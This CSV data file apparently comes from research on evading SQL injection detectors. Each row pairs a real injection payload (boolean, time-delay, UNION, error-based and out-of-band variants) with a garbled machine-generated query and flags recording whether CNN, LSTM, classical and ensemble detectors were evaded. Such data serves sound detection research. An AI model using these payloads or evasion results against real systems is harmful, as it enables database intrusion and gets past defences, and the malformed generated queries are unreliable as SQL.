,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
5438,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd","SELECT MIN(""xopd"") FROM SQL injection detection",1,1,0,0,1,0,0
5439,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,SELECT MIN(%) FROM SQL injection detection,1,0,0,1,1,1,0
5440,-2866'   )    )    or 4491  =  9429#,SELECT MIN(9429#) FROM SQL injection detection,1,1,1,1,1,1,1
5441,"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL_INjection) AS c1 FROM SELECT SELECT MIN(*) FROM SQL_INjection) FROM SELECT SELECT MIN(*) FROM SELECT SUM(*) FROM SELECT SELECT SUM(sys1,sysusers as sysusers as sys1,sysusers as sysusers as sysusers as sys1,sysusers as sys7 WHERE sysusers as sysusers as sys1,sysusers as sysusers as sys7",1,1,0,0,0,0,0
5442,end and    (    (   'pfrt'  =  'pfrt,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
5443,1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,"SELECT 6969 FROM pg_sleep WHERE ""sql injection"" ='sq injection' AND NOT 6969 = (SELECT 6969 FROM pg_sleep ( 5 )')",0,1,0,0,0,0,0
5444,"iif  (  7011  =  2522,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
5445,-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,SELECT MIN(sql injection) FROM SQL_injection WHERE 2821 = 2821 OR 5982 = 1643,1,1,0,1,0,0,0
5446,-3339' or 8571  =  8571--,"SELECT MIN(sql injection) FROM SQL SELECT -3339', 8571 = 8571 - SELECT MIN(8571 = 8571 - SELECT MIN(8571 = 8571 - SELECT MIN(sql injection) FROM SQL injection",1,1,0,0,0,0,0
5447,"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '","SELECT MIN(sql injection) FROM SQL_injection, EXCEPT SELECT DISTINCT chr ( 65 ) FROM dbms_pipe.receive_message WHERE NOT chr ='sq injection'",1,1,0,1,1,1,0
5448,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic","SELECT MIN(SQL injection) FROM SQL SELECT 6272 = 6272,sleep ( 5 ) & hvic FROM elt",1,1,0,1,0,0,0
5449,1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,SELECT MIN(3020 = 3020) FROM SQL injection detection WHERE NOT SELECT SELECT DISTINCT SUM(SQL) FROM Query: 1' AND 3020 = 3020,1,1,0,0,1,0,0
5450,"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",SELECT * FROM SQL_injections WHERE NOT char(5451 = 5451) AND NOT char(5451 = 5451) ORDER BY query_schema.system_users,1,1,0,0,0,0,0
5451,"-6108'  )   union all select 2519,2519,2519,2519--","SELECT MIN(2519,2519,2519--) FROM SQL_Injection AS t1 JOIN 2519,2519-- FROM SQL_Injection AS t2 ON t1.Required = 'SQ'",1,1,1,1,0,1,0
5452,"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(selection___) FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3 ) = 3580",0,1,0,0,0,0,0
5453,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 2839 = 2839 AND all_users = 5556 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(*) FROM SQL)),1,1,0,0,1,0,0
5454,"-6848""   )    )    or 4071  =  5312","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -6848"" ORDER BY MIN(sql injection)",1,1,1,1,1,1,1
5455,"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM generate_series WHERE NOT SELECT MIN(short_number) FROM query_series WHERE query: 1"" = 8635",1,1,0,0,1,0,0
5456,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
5457, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,SELECT MIN(srmq) FROM SQL injection,1,1,0,1,1,1,0
5458,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,SELECT SELECT'stsu' FROM SQL injection detection WHERE 2386 = 2386 OR sleep ( 5 ) = 5,1,1,0,0,0,0,0
5459,"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --","SELECT NOT SQL_inject_rePLXP000000 FROM SQL WHERE 9149 = 9149 AND NOT char( 120 ) ||char ( 117 ) ||char ( 5000000000 ) FROM query: 1 WHERE NOT SQL_inject_required = ""valid""",1,1,0,0,0,0,0
5460,-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,SELECT MIN(*) FROM SQL injection detection WHERE NOT'sq injection detection',1,0,1,1,1,1,1
5461,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',SELECT MIN(sql injection) FROM SQL_injection WHERE NOT chr = 2615 AND 4386 = utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ||chr (SELECT SUM(sql injection) FROM SELECT MIN(succl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr,1,1,0,0,1,0,0
5462,-4583'  )   as evbo where 6055  =  6055 union all select 6055--,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
5463,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
5464,1'||  (  select 'kptj' from dual where 5123  =  5123,SELECT 'kptj' FROM SQL injection detection',1,0,1,1,1,1,1
5465,"-3126   )    )    union all select 6718,6718,6718,6718,6718--","SELECT 6718,6718,6718,6718-- FROM SQL SELECT 6718,6718,6718-- FROM SELECT 6718, MIN(SQL) FROM 6718,6718,6718,6718-- Fors = ""SQL injection detection""",1,1,1,0,0,0,0
5466,"-7448 union all select 4072,4072#","SELECT MIN(SQL) FROM SQL SELECT -7448 union FROM 4072,4072#",1,1,1,1,0,1,0
5467,"1""   )    )    and 9800  =  8713","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1""",1,1,1,0,1,1,0
5468,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda","SELECT dbms_pipe.receive_message, MIN(sql) FROM dbms_pipe.receive_message WHERE NOT chr ( 101 ) = 67 ) AND fvda = ""fvda""",1,1,0,0,1,0,0
5469,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM sysibm.systables as t3 ORDER BY t1.sysibm.systables as t3",1,1,0,1,0,0,0
5470,"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""erua""  =  ""erua",SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY __chr ( (SELECT SUM((sql_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.in,1,1,1,1,1,1,1
5471,"-4919  )   union all select 2608,2608,2608,2608,2608,2608#","SELECT MIN(sql injection) FROM SQL -4919 - union All select 2608,2608,2608,2608,2608# FROM SQL SELECT MIN(sql injection) FROM Query: -4919 )",0,1,1,1,0,1,0
5472,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ","SELECT DISTINCT t1.selection FROM SQL injection AS t1 JOIN Query: 1' AND t2.qqpjq = ""6240"" AND t2.qqpjq = ""1 else 0 end from rdb$database )||'qzvzq'",0,1,0,0,0,0,0
5473,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--","SELECT MIN(5509,5509,5509,5509,5509-- - syst_injection) FROM SQL_injection WHERE NOT SELECT MIN(syst_injection) FROM Query: -2434'",0,1,1,0,1,1,0
5474,"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ||chr ( SELECT MIN(sql_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr,1,1,1,0,1,1,0
5475,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SELECT MIN(extractionvalue) FROM SQL injection",1,0,1,0,1,1,0
5476,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv","SELECT MIN(sequence) FROM SQL injection - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM SQL - SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM (SELECT SUM(SELECT, SUM(swift) FROM (SELECT,'swich (swift) FROM SELECT,'swift_search: 1','sql injection','sql injection') and (SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM SELECT SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM (SELECT MIN(sequence) FROM SQL",1,1,0,0,1,0,0
5477,"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) = '7122,7122,7122,7122,7122,7122,7122-- SELECT MIN(7122,7122,7122,7122-- SELECT MIN(7122,7122,7122,7122,7122-- FROM SQL_Injection) = 'SQL'",1,1,0,0,0,0,0
5478,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',SELECT MIN(2301 = 7504 ) *7504 AND NOT'sql injection detection',0,1,0,0,0,0,0
5479,"iif  (  1378  =  6569,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,1,1,1,1,1,1
5480,"1,  (  select   (  case when   (  5726  =  5275  )   then 1 else 1/  (  select 0  )   end   )    )   ",SELECT MIN(SELECT 0 FROM SQL injection detection),1,0,1,1,1,1,1
5481,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) AND NOT (SELECT * FROM (SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * SELECT * FROM * 0x7171706a71,'sql injection') AND (SELECT * FROM * - (SELECT * FROM SQL_injection_injection_injection_injection_injection_injection_blkt,'sql','sql injection')",1,1,0,1,1,1,0
5482,"-2605%'   )    )     )   union all select 4738,4738#","SELECT MIN(SQL) FROM 4738,4738# FROM SQL SELECT MIN(SQL) FROM query: -2605%' )",1,1,0,0,1,0,0
5483,"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,SELECT MIN((((((((((((((((((()) FROM SQL injection) FROM SQL injection),1,1,0,0,1,0,0
5484,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh","SELECT MIN(1808,concat) FROM SQL_injection, 'evade SQL injection', COUNT(*) FROM SQL_injection) AND NOT 0x7171706a71 - (SELECT MIN(1808, 1808, 1808, 1808,19) FROM SQL_Injection)",1,1,0,0,1,0,0
5485,"1' union all select null,null,null,null,null,null,null--","SELECT MIN(sql injection) FROM SQL SELECT MIN(null),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, SELECT FROM SQL Query: 1' union All select null,null,null,null,null,null,null,null,null,null,null,null,null-- Query: 1' union All select null,null,null,null,null,null,null,null,null,null,null,null,null--"" FROM SQL injection detection'",0,1,0,0,0,0,0
5486,5739-5738,"SELECT MIN(sql) FROM query: 5739-5738 WHERE NOT 5739-5738 = ""SQL injection""",1,1,1,1,0,1,0
5487,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--","SELECT 9322,9322,9322-- FROM SQL injection_description WHERE NOT SELECT 9322,9322-- FROM SQL_Injection_Procedures AS __sql_injection_method ='sql injection'",1,1,1,1,0,1,0
5488,select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,"SELECT 7033 FROM SQL AS _number WHERE NOT SELECT SQL_inject_schema.character_sets = ""done"" ORDER BY COUNT(*) DESC LIMIT 7033 AND 7033 = ""Information_schema.character_sets ) end )",0,1,0,0,0,0,0
5489,"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""qzzg"" like ""qzzg",SELECT MIN(sequence) FROM SQL injection detection) FROM SQL SELECT & qzzg FROM (SELECT MIN(sequence) FROM SQL injection detection),1,0,1,1,1,1,1
5490,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",SELECT MIN(sequence) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM query: 1% AND 8594 = (SELECT MIN(selection) FROM pg_sleep ( 5 ),1,1,0,0,1,0,0
5491,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ","SELECT MIN(excat) FROM SQL injection, extractvalue WHERE NOT md5 ( 0x52515a50 ) = 'exces'",1,1,0,0,1,0,0
5492,"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  ""","SELECT MIN(sql injection) FROM SQL_inaddr WHERE NOT chr = 4493 OR 4493 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( SELECT SUM(SQL) FROM chr ( 4493 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.in",1,1,0,0,1,0,0
5493,"1""   )    )    as nejd where 2885  =  2885",SELECT MIN(2885 = 2885) FROM SQL injection detection,1,1,1,1,1,1,1
5494,-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,SELECT MIN(sqpjq) FROM SQL_injection WHERE 5903 = 5903 AND 5903 = 5903 = '1 else 0 end from rdb$database ) ||'qzvzq',1,1,0,0,0,0,0
5495,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847","SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM SQL SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM Query: SELECT MIN(50047 = 9847) FROM SQL SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM benchmark) AND (((((() = 9847) FROM SQL injection) FROM SELECT SELECT, SUM( 5000000,md5 ( 0x4c4d6142 ) FROM SELECT,'sql injection') FROM SELECT,'sqmd5 ( 5000000,md5 ( 5000000,md5 ( 0x4c4d6142 ) FROM SELECT,'sql injection)'",1,1,0,0,0,0,0
5496,"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw","SELECT MIN(sql injection) FROM SQL_injection) ORDER BY 9354 = 9354,7185",0,1,1,0,0,0,0
5497,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",SELECT 8391 = 8391 FROM SQL injection detection,1,1,0,1,1,1,0
5498,-4562'  )   or 3038  =  3038,SELECT MIN(3038 = 3038 FROM SQL injection detection,1,1,0,1,1,1,0
5499,"1""  )   where 7840  =  7840 union all select null,null#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
5500,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
5501,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb","SELECT * FROM SQL injection, COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 AND (yobb) ='sq injection')",1,1,0,0,0,0,0
5502,"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ","SELECT MIN(1210 = 1210,sleep ( 5 ) FROM SQL injection detection) FROM SQL injection detection",1,1,0,0,1,0,0
5503,"-9037%"" union all select 6583#",SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -9037% union All select 6583#,1,1,0,0,1,0,0
5504,"1"" where 7022  =  7022",SELECT MIN(7022 = 7022) FROM SQL injection detection,1,1,0,0,1,0,0
5505,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#","SELECT 8819,8819,8819,8819 FROM SQL_Injections WHERE NOT SELECT 8819,8819,8819 FROM SQL_Injections WHERE NOT SELECT 8819,8819,8819 FROM SQL_Injections WHERE NOT SELECT 8819,8819,8819 FROM SQL_Injections WHERE NOT 8819 IN (SELECT 8819,8819 FROM Query: -4285'))",1,1,0,1,1,1,0
5506,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,"SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1 WHERE NOT 7689 = 7689 AND NOT jduw = ""1 else 0x28 end )""",1,1,0,0,0,0,0
5507,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'fsvr'  =  'fsvr","SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql ) FROM (SELECT, SUM(svr) FROM SELECT, SUM(sql) FROM SELECT, SUM(svr) FROM SQL SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT, SUM(sql) FROM SELECT MIN(s",1,0,1,0,1,1,0
5508,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ","SELECT NOT SQL_inject FROM query: 1 AND NOT SELECT SELECT MIN(1210 = 1210,sleep ( 5 ) FROM query: 1",1,1,0,0,1,0,0
5509,select case when 2948  =  7279 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL SELECT MIN(2948 = 7279) FROM SQL injection detection,1,1,0,0,1,0,0
5510,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --","SELECT MIN(6165 ) FROM SQL injection_diagnosis WHERE 6379 = 6379 OR 6379 = 6379 OR elt (6945 = 6165,6165 )",1,1,1,0,0,0,0
5511,"1%' union all select null,null,null--","SELECT MIN(null,null--) FROM SQL injection detection",1,1,1,1,1,1,1
5512,"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  ""","SELECT * FROM SQL_Injection, COUNT(*) FROM SQL_Injection) AND NOT (SELECT MIN((*) FROM SQL_Injection) FROM SQL_Injection)",1,1,0,0,1,0,0
5513,"-8133'  )   union all select 6417,6417,6417,6417,6417,6417,6417,6417--","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417,6417",1,1,1,0,0,0,0
5514,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#","SELECT'sql injection' FROM SQL SELECT MIN(sQl injection) FROM Query: -5396'|| WHERE 4019 = 4019 = 4019 union All select 4019,4019,4019# FROM SQL SELECT 'fjhd' FROM SQL SELECT 'fjhd' FROM SQL SELECT MIN(sql injection) FROM Query: -5396'|| WHERE 4019 = 4019 = 4019 = 4019 = 4019 = 4019 = 4019",1,1,0,0,0,0,0
5515,"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL injection, SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM rdb$fields as t2,rdb$functions as t3,rdb$functions as t4 JOIN detection of evade SQL injection detection' FROM rdb$fields WHERE 5312 = 5312 OR 7552 = (SELECT MIN(*) FROM rdb$functions as t4 FROM rdb$functions as t4 JOIN Query: 1 JOIN SELECT SELECT SELECT MIN(sql injection) FROM rdb$functions as t3,rdb$functions as t4 FROM rdb$fields as t4 WHERE t1.rdb$types = ""5312 = 5312 = 5312 = 5312 OR 7552 = (SELECT MIN(succt_diddido) FROM rdb$functions as t",1,1,0,0,0,0,0
5516,"1   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   4048  =  4048",SELECT MIN(4048 = 4048) FROM SQL injection,1,1,1,1,1,1,1
5517,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection detection WHERE ""3393 = 3393 = 3393 or 9643 = (SELECT MIN(*) FROM SQL injection detection)",0,1,0,0,1,0,0
5518,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
